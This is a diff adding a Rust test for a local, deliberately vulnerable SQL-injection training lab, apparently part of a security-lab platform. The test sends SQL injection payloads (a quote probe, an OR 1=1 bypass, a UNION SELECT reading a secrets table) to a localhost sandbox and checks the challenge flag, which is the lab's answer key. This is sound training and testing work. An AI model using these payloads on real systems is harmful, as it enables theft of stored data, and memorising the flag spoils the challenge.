@@ -1892,4 +1892,129 @@ mod tests {
             "A04 must report stopped after stop_lab"
         );
     }
+
+    #[test]
+    #[cfg(windows)]
+    fn test_a05_native_sandbox_lifecycle_and_challenge() {
+        let repo_root = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
+            .parent()
+            .unwrap()
+            .parent()
+            .unwrap()
+            .to_path_buf();
+
+        let a05_bin = repo_root
+            .join("labs")
+            .join("A05")
+            .join("bin")
+            .join("a05-lab.exe");
+        let built_bin = repo_root
+            .join("engine")
+            .join("rust")
+            .join("target")
+            .join("debug")
+            .join("a05_lab.exe");
+        if built_bin.exists() {
+            let _ = fs::create_dir_all(a05_bin.parent().unwrap());
+            let _ = fs::copy(&built_bin, &a05_bin);
+        }
+        if !a05_bin.exists() {
+            eprintln!("Skipping test: a05-lab.exe not deployed yet");
+            return;
+        }
+
+        let _ = stop_lab(&repo_root, "A05");
+
+        // 1. Status before start
+        let st_init = get_lab_status(&repo_root, "A05");
+        assert!(st_init.installed, "A05 must be installed");
+        assert!(!st_init.running, "A05 should not be running initially");
+
+        // 2. Start A05
+        let start_res = start_lab(&repo_root, "A05");
+        assert!(start_res.is_ok(), "start_lab must succeed: {:?}", start_res);
+
+        // 3. Status when running
+        let st_running = get_lab_status(&repo_root, "A05");
+        assert!(st_running.running, "A05 must report running");
+        assert!(st_running.url.is_some(), "A05 must have URL");
+        let entry_url = st_running.url.unwrap();
+        assert!(entry_url.starts_with("http://127.0.0.1:"));
+        assert!(entry_url.contains("/session/"));
+
+        let port = st_running.port;
+        let token = entry_url
+            .split("/session/")
+            .nth(1)
+            .unwrap()
+            .trim_end_matches('/');
+
+        let send_req = |req_str: &str| -> String {
+            use std::io::{Read, Write};
+            let mut stream = std::net::TcpStream::connect(format!("127.0.0.1:{}", port)).unwrap();
+            stream.write_all(req_str.as_bytes()).unwrap();
+            stream.flush().unwrap();
+            let mut buf = Vec::new();
+            let _ = stream.read_to_end(&mut buf);
+            String::from_utf8_lossy(&buf).to_string()
+        };
+
+        // 4. Normal search: GET /session/{token}/?q=Server
+        let req_norm = format!(
+            "GET /session/{}/?q=Server HTTP/1.1\r\nHost: 127.0.0.1:{}\r\n\r\n",
+            token, port
+        );
+        let resp_norm = send_req(&req_norm);
+        assert!(resp_norm.starts_with("HTTP/1.1 200 OK"));
+        assert!(resp_norm.contains("Rackmount Server 2U"));
+
+        // 5. Syntax error check: GET /session/{token}/?q=%27
+        let req_syntax = format!(
+            "GET /session/{}/?q=%27 HTTP/1.1\r\nHost: 127.0.0.1:{}\r\n\r\n",
+            token, port
+        );
+        let resp_syntax = send_req(&req_syntax);
+        assert!(resp_syntax.starts_with("HTTP/1.1 200 OK"));
+        assert!(resp_syntax.contains("sqlite3.OperationalError"));
+
+        // 6. Boolean bypass: GET /session/{token}/?q=%27+OR+1%3D1+--
+        let req_bool = format!(
+            "GET /session/{}/?q=%27+OR+1%3D1+-- HTTP/1.1\r\nHost: 127.0.0.1:{}\r\n\r\n",
+            token, port
+        );
+        let resp_bool = send_req(&req_bool);
+        assert!(resp_bool.starts_with("HTTP/1.1 200 OK"));
+        assert!(resp_bool.contains("Edge Firewall Gateway"));
+        assert!(resp_bool.contains("Biometric Access Terminal"));
+
+        // 7. UNION extraction: GET /session/{token}/?q=%27+UNION+SELECT+secret_name%2C+secret_data%2C+0+FROM+vault_secrets+--
+        let req_union = format!(
+            "GET /session/{}/?q=%27+UNION+SELECT+secret_name%2C+secret_data%2C+0+FROM+vault_secrets+-- HTTP/1.1\r\nHost: 127.0.0.1:{}\r\n\r\n",
+            token, port
+        );
+        let resp_union = send_req(&req_union);
+        assert!(resp_union.starts_with("HTTP/1.1 200 OK"));
+        assert!(resp_union.contains("PROJECT_ZITERA_CORE_FLAG"));
+        assert!(resp_union.contains("ZITERA{5q1_1nj3ct10n_m45t3r_2026}"));
+
+        // 8. Validate Challenge submission
+        let verif =
+            validate_challenge(&repo_root, "A05", "ZITERA{5q1_1nj3ct10n_m45t3r_2026}")
+                .unwrap();
+        assert_eq!(
+            verif.status, "passed",
+            "Challenge flag must pass validation"
+        );
+
+        // 9. Stop A05
+        let stop_res = stop_lab(&repo_root, "A05");
+        assert!(stop_res.is_ok());
+
+        // 10. Status after stop
+        let st_stopped = get_lab_status(&repo_root, "A05");
+        assert!(
+            !st_stopped.running,
+            "A05 must report stopped after stop_lab"
+        );
+    }
 }
